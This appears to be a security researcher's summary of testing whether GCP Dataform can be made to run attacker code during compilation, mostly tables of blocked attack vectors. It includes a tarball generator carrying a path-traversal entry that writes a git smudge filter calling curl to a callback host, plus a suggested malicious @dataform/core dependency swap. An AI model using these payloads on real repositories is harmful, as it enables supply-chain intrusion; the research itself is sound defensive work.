# GCP Dataform Security Research Summary

## Research Goal

Investigate whether an attacker with write access to a Dataform repository can achieve Remote Code Execution (RCE) on GCP infrastructure during the compilation phase.

**Primary Attack Vector:** Overwrite `.git/config` to inject malicious git filter drivers that execute during `git checkout`.

---

## Environment Details

| Component | Details |
|-----------|---------|
| **Target** | GCP Dataform (Cloud) |
| **Repository** | `dataform-poc-test` in `shir-research-3` project |
| **Location** | `us-central1` |
| **Dataform Core Version** | 2.9.0 |
| **npm Version** | 8.18.0 |
| **Runtime** | Plain V8 (NOT Node.js) |
| **OAST Server** | `juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun` |

---

## Confirmed Dataform Protections

| Protection | Evidence | Impact |
|------------|----------|--------|
| `--ignore-scripts` | No OAST callbacks from lifecycle scripts | Blocks preinstall/postinstall/prepare |
| `--no-bin-links` | node_modules/.bin doesn't exist | Blocks bin field path traversal |
| node-tar patched | TAR_ENTRY_ERROR on `../` paths | Blocks tar-slip, symlinks, hardlinks |
| Path validation in restricted_fs | /proc, /etc blocked | Blocks credential leakage |
| V8 sandbox | No Node.js APIs available | Blocks fs, child_process, network |

---

## Attack Vectors Tested

### 1. NPM Lifecycle Scripts

| Vector | Result |
|--------|--------|
| Root package `postinstall` | **BLOCKED** - `--ignore-scripts` |
| Dependency `postinstall` | **BLOCKED** - `--ignore-scripts` |
| `bundledDependencies` scripts | **BLOCKED** - `--ignore-scripts` |
| `.npmrc` override | **BLOCKED** - CLI flags take precedence |

### 2. Tarball Path Traversal (node-tar)

| Vector | Result |
|--------|--------|
| `../../../.git/config` path | **BLOCKED** - TAR_ENTRY_ERROR |
| Symlinks to .git/config | **BLOCKED** - node-tar validation |
| Hardlinks to .git/config | **BLOCKED** - node-tar validation |
| Dir-to-symlink swap (CVE-2021-32803) | **BLOCKED** - patched |
| Unicode normalization bypass | **BLOCKED** |
| Multiple leading slashes | **BLOCKED** |
| bin field path traversal | **BLOCKED** - `--no-bin-links` |

### 3. V8 Sandbox Escape

| Vector | Result |
|--------|--------|
| `require('fs')` | **BLOCKED** - V8 has no fs module |
| `require('child_process')` | **BLOCKED** - V8 has no child_process |
| `require('http')` | **BLOCKED** - V8 has no networking |
| Function constructor escape | **BLOCKED** - returns sandbox global |
| Error.prepareStackTrace leak | **BLOCKED** - no host references |
| Proxy/Reflect interception | Works but can't escape sandbox |
| WebAssembly | Available but sandboxed |
| SharedArrayBuffer/Atomics | Available (potential timing attacks) |

### 4. Filesystem Access (restricted_fs)

| Path | Result |
|------|--------|
| `/proc/self/environ` | **BLOCKED** - exists() returns false |
| `/proc/self/mounts` | **BLOCKED** - exists() returns false |
| `/proc/self/cmdline` | **BLOCKED** - exists() returns false |
| `/etc/passwd` | **BLOCKED** - exists() returns false |
| Path traversal (`../../..`) | **BLOCKED** - INVALID_ARGUMENT |
| `.git/config` (project) | **ALLOWED** - can read |
| `node_modules/` | **ALLOWED** - can read |
| `definitions/` | **ALLOWED** - can read |

### 5. Git Submodules

| Test | Result |
|------|--------|
| `.gitmodules` with OAST URL | **BLOCKED** - Submodules not processed |

---

## V8 Sandbox Analysis

**Key Finding:** Dataform runs on a **plain V8 runtime**, NOT Node.js.

### What's Available in V8 Sandbox:

```javascript
// Available globals (from comprehensive_sandbox_probe results):
globalThis: Object, Function, Array, String, Number, Boolean, Symbol,
           Date, Promise, RegExp, Error, JSON, Math,
           ArrayBuffer, Uint8Array, DataView, Map, Set, WeakMap, WeakSet,
           Proxy, Reflect, WebAssembly, SharedArrayBuffer, Atomics,
           eval, Function constructor

// Dataform-provided:
restricted_fs: { readFile, exists, isDirectory }  // READ-ONLY
vm: { compileModule }
require: [custom implementation, NOT Node.js require]
process: { env: {} }  // Fake, limited
console: { log, warn, error, ... }
core: { adapters, compiler, session, ... }  // @dataform/core
```

### What's NOT Available:

```javascript
// Node.js APIs - ALL BLOCKED:
fs, child_process, http, https, net, os, path, crypto
Buffer, setTimeout, setInterval, setImmediate
fetch, XMLHttpRequest, WebSocket
```

---

## Useful Commands

### Trigger Dataform Compilation

```bash
# Get fresh access token
gcloud auth print-access-token > /tmp/token.txt

# Trigger compilation
TOKEN=$(cat /tmp/token.txt)
curl -s -X POST "https://dataform.googleapis.com/v1beta1/projects/shir-research-3/locations/us-central1/repositories/dataform-poc-test/compilationResults" \
  --header "Authorization: Bearer $TOKEN" \
  --header "Content-Type: application/json" \
  --data '{"gitCommitish": "main"}'
```

### Get Compilation Results

```bash
# Get compilation result (replace ID with actual compilation ID)
COMPILATION_ID="584ea402-c648-411c-9fdb-723242587a7e"
TOKEN=$(cat /tmp/token.txt)

# Get metadata
curl -s "https://dataform.googleapis.com/v1beta1/projects/shir-research-3/locations/us-central1/repositories/dataform-poc-test/compilationResults/${COMPILATION_ID}" \
  --header "Authorization: Bearer $TOKEN"

# Get compiled SQL actions
curl -s -G "https://dataform.googleapis.com/v1beta1/projects/shir-research-3/locations/us-central1/repositories/dataform-poc-test/compilationResults/${COMPILATION_ID}:query" \
  --header "Authorization: Bearer $TOKEN" \
  --data-urlencode "pageSize=200" > /tmp/results.json

# Parse specific test results
python3 << 'EOF'
import json
with open('/tmp/results.json') as f:
    d = json.load(f)
for a in d.get('compilationResultActions', []):
    if 'proc' in a['filePath'].lower():
        print('=== ' + a['filePath'] + ' ===')
        if 'relation' in a:
            print(a['relation'].get('selectQuery', '')[:2000])
EOF
```

### Create Test Tarballs

```python
#!/usr/bin/env python3
import tarfile
import io

OAST = "juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun"

def create_tarball(filename, entries):
    """Create a tarball with given entries"""
    tar = tarfile.open(filename, 'w:gz')
    for name, content, entry_type in entries:
        info = tarfile.TarInfo(name=name)
        if entry_type == 'file':
            info.size = len(content)
            tar.addfile(info, io.BytesIO(content))
        elif entry_type == 'symlink':
            info.type = tarfile.SYMTYPE
            info.linkname = content
            tar.addfile(info)
        elif entry_type == 'hardlink':
            info.type = tarfile.LNKTYPE
            info.linkname = content
            tar.addfile(info)
    tar.close()

# Example: Create tarball with path traversal attempt
entries = [
    ('package/package.json', b'{"name":"test","version":"1.0.0"}', 'file'),
    ('package/index.js', b'module.exports = {};', 'file'),
    ('package/../../../.git/config', b'[filter "x"]\n  smudge=curl ' + OAST.encode(), 'file'),
]
create_tarball('traversal_test.tar.gz', entries)
```

### Host Tarballs via ngrok

```bash
# Start HTTP server
cd /path/to/tarballs
python3 -m http.server 8080 &

# Expose via ngrok
ngrok http 8080
# Copy the https URL, e.g., https://abc123.ngrok.io/test.tar.gz
```

### Git Operations

```bash
# Push changes and trigger compilation
cd /Users/nirohfeld/work/jgit/poc/dataform
git add .
git commit -m "Test description"
git push

# Then trigger compilation via API
```

---

## Test Files Created

### SQLX Test Files (in `definitions/`)

| File | Purpose |
|------|---------|
| `v8_proc_test.sqlx` | Test /proc filesystem access |
| `comprehensive_sandbox_probe.sqlx` | Full V8 sandbox enumeration |
| `final_wasm_sab_test.sqlx` | WebAssembly & SharedArrayBuffer |
| `restricted_fs_test.sqlx` | restricted_fs capabilities |
| `git_dir_test.sqlx` | .git directory access |
| `git_deep_test.sqlx` | Deep .git exploration |
| `function_escape.sqlx` | Function constructor escape |
| `prototype_pollution_test.sqlx` | Prototype pollution |
| `path_traversal_test.sqlx` | Path traversal attempts |
| `npm_bypass_check.sqlx` | npm bypass verification |
| `redshift_adapter_test.sqlx` | AWS SDK loading test |
| `aws_env_test.sqlx` | AWS environment probe |

### Python Scripts (for tarball creation)

| File | Purpose |
|------|---------|
| `create_all_tarballs.py` | Create various exploit tarballs |
| `npm_bypass_tests/` | Directory with bypass test tarballs |

---

## Key Findings Summary

### What WORKS (Attacker Capabilities):

1. **Read .git/config** - Can read full git configuration
2. **Read project files** - Full access to definitions/, node_modules/
3. **Execute JavaScript in V8** - Code runs during compilation
4. **WebAssembly execution** - WASM modules can run
5. **SharedArrayBuffer/Atomics** - Available (timing attack potential)
6. **Prototype pollution** - Can pollute Object prototype

### What's BLOCKED:

1. **Write to filesystem** - No writeFile in restricted_fs
2. **Network access** - No fetch, XMLHttpRequest, http
3. **System file access** - /proc, /etc blocked
4. **NPM script execution** - --ignore-scripts
5. **Tarball path traversal** - node-tar patched
6. **Node.js APIs** - Pure V8 runtime

### Attack Surface Remaining:

1. **Replace @dataform/core** - Use tarball URL for malicious core package
2. **V8 engine exploits** - Memory corruption in WASM/V8
3. **Timing attacks** - SharedArrayBuffer enables high-precision timing
4. **BigQuery injection** - SQL injection in compiled queries
5. **Information disclosure** - Read sensitive project files

---

## Dataform Compilation Flow

```
1. Git clone repository → .git/ created (we can't modify this)
2. Read dataform.json / workflow_settings.yaml
3. npm ci --ignore-scripts --no-bin-links (protected)
4. V8 sandbox initialized with restricted_fs, vm, require
5. @dataform/core loaded (we control via package.json)
6. SQLX files compiled in V8 (our code runs here)
7. SQL output returned (BigQuery injection possible)
```

---

## Files & Paths

```
/Users/nirohfeld/work/jgit/poc/dataform/
├── definitions/              # SQLX test files
│   ├── v8_proc_test.sqlx
│   ├── comprehensive_sandbox_probe.sqlx
│   └── ...
├── package.json             # npm dependencies
├── dataform.json            # Dataform config
├── .gitmodules              # Submodule test
└── RESEARCH_SUMMARY.md      # This file

/tmp/
├── token.txt                # gcloud access token
├── results.json             # Compilation results
├── trigger_compilation.sh   # Trigger script
└── get_new_compilation.sh   # Get results script

Plan file: /Users/nirohfeld/.claude/plans/majestic-marinating-tome.md
```

---

## Conclusions

**GCP Dataform has robust sandboxing:**

1. npm install is heavily restricted (`--ignore-scripts`, `--no-bin-links`)
2. node-tar is patched against path traversal
3. V8 runtime has no Node.js APIs
4. restricted_fs has strict path validation
5. No write capability to filesystem

**Remaining attack surface is limited to:**

1. Information disclosure (read project files, .git/config)
2. Potential BigQuery injection via compiled SQL
3. Replacing @dataform/core with malicious tarball (requires further testing)
4. V8/WASM engine-level exploits (complex, requires CVEs)

---

## How to Continue Testing

1. **Test @dataform/core replacement:**
   ```json
   {
     "dependencies": {
       "@dataform/core": "https://your-server.com/evil-core.tar.gz"
     }
   }
   ```

2. **Monitor OAST server:**
   - Check `https://app.interactsh.com` for callbacks
   - Domain: `juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun`

3. **Create new test SQLX:**
   ```javascript
   config { type: "view", name: "new_test" }
   js {
     let results = [];
     // Your test code here
   }
   SELECT '${JSON.stringify(results)}' as test_results
   ```

4. **Push and compile:**
   ```bash
   git add . && git commit -m "Test" && git push
   # Then trigger via API
   ```
